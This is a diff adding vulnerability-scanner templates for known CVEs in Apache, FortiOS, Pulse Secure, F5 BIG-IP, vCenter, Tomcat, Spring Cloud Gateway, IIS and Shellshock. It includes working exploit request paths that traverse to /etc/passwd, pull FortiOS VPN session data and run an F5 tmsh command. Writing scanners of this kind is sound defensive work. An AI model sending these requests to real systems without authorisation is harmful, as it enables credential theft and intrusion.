@@ -4155,6 +4155,444 @@
           ]
         }
       ]
+    },
+    {
+      "id": "cve-2021-41773-apache-traversal",
+      "info": {
+        "name": "Apache 2.4.49/50 path traversal (file read)",
+        "severity": "critical",
+        "cve": "CVE-2021-41773",
+        "tags": [
+          "apache",
+          "lfi",
+          "traversal"
+        ],
+        "description": "Apache path traversal reads arbitrary files.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+            "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:",
+                "daemon:.*:/usr/sbin"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2018-13379-fortinet",
+      "info": {
+        "name": "Fortinet FortiOS path traversal",
+        "severity": "critical",
+        "cve": "CVE-2018-13379",
+        "tags": [
+          "fortinet",
+          "vpn",
+          "lfi"
+        ],
+        "description": "FortiOS SSL VPN path traversal.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "var fgt_lang",
+                "sslvpn_websession"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-11510-pulse",
+      "info": {
+        "name": "Pulse Secure VPN file read",
+        "severity": "critical",
+        "cve": "CVE-2019-11510",
+        "tags": [
+          "pulse",
+          "vpn",
+          "lfi"
+        ],
+        "description": "Pulse Connect Secure arbitrary file read.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:",
+                "daemon:.*:/usr/sbin"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-5902-f5",
+      "info": {
+        "name": "F5 BIG-IP TMUI RCE marker",
+        "severity": "critical",
+        "cve": "CVE-2020-5902",
+        "tags": [
+          "f5",
+          "bigip",
+          "rce"
+        ],
+        "description": "F5 BIG-IP TMUI unauthenticated command.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "auth user admin",
+                "description \"",
+                "shell tmsh"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-21972-vcenter",
+      "info": {
+        "name": "VMware vCenter path marker",
+        "severity": "high",
+        "cve": "CVE-2021-21972",
+        "tags": [
+          "vmware",
+          "vcenter",
+          "rce"
+        ],
+        "description": "vCenter vRealize plugin endpoint reachable.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/ui/vropspluginui/rest/services/uploadova"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                405
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "uploadFile",
+                "org.springframework.web.multipart"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2017-12617-tomcat",
+      "info": {
+        "name": "Apache Tomcat PUT JSP marker",
+        "severity": "high",
+        "cve": "CVE-2017-12617",
+        "tags": [
+          "tomcat",
+          "rce"
+        ],
+        "description": "Tomcat manager reachable.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/manager/html",
+            "/host-manager/html"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                401
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "Tomcat Web Application Manager",
+                "<title>Apache Tomcat",
+                "tomcat-users.xml"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2022-22947-spring-gateway",
+      "info": {
+        "name": "Spring Cloud Gateway SpEL marker",
+        "severity": "critical",
+        "cve": "CVE-2022-22947",
+        "tags": [
+          "spring",
+          "gateway",
+          "rce"
+        ],
+        "description": "Spring Cloud Gateway actuator route injection surface.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/actuator/gateway/routes"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"filter_definitions\"",
+                "\"AddResponseHeader\"",
+                "\"route_id\""
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "generic-lfi-passwd",
+      "info": {
+        "name": "Generic LFI /etc/passwd read",
+        "severity": "high",
+        "cve": "",
+        "tags": [
+          "lfi",
+          "traversal"
+        ],
+        "description": "A parameter or path allows reading /etc/passwd.",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/....//....//....//etc/passwd",
+            "/..%2f..%2f..%2fetc%2fpasswd",
+            "/index.php?page=../../../../etc/passwd",
+            "/download?file=../../../../etc/passwd"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:",
+                "daemon:.*:/usr/sbin"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2015-1635-iis",
+      "info": {
+        "name": "Microsoft IIS HTTP.sys marker",
+        "severity": "high",
+        "cve": "CVE-2015-1635",
+        "tags": [
+          "iis",
+          "microsoft"
+        ],
+        "description": "IIS version potentially affected by HTTP.sys (needs Range check).",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "header": "Server",
+              "regex": [
+                "Microsoft-IIS/(6\\.|7\\.|7\\.5|8\\.)"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2014-6271-shellshock",
+      "info": {
+        "name": "Shellshock CGI marker",
+        "severity": "critical",
+        "cve": "CVE-2014-6271",
+        "tags": [
+          "shellshock",
+          "rce",
+          "cgi"
+        ],
+        "description": "A CGI endpoint is reachable (Shellshock candidate).",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/cgi-bin/",
+            "/cgi-bin/status",
+            "/cgi-bin/test.cgi"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            },
+            {
+              "type": "header",
+              "header": "Server",
+              "regex": [
+                "Apache"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<html",
+                "<!doctype"
+              ],
+              "condition": "or",
+              "negative": true
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "#!/bin",
+                "Content-type: text/",
+                "CGI"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
     }
   ]
 }
